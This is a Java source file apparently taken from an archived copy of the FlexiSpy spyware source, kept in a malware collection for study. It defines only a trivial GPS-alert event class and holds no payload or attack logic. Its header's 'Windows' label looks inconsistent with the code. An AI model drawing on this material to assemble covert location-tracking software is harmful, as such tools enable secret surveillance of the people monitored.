/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.event;

public class AlertGPSEvent extends PanicEvent {

	public EventType getEventType() {
		return EventType.ALERT_GPS;
	}
}
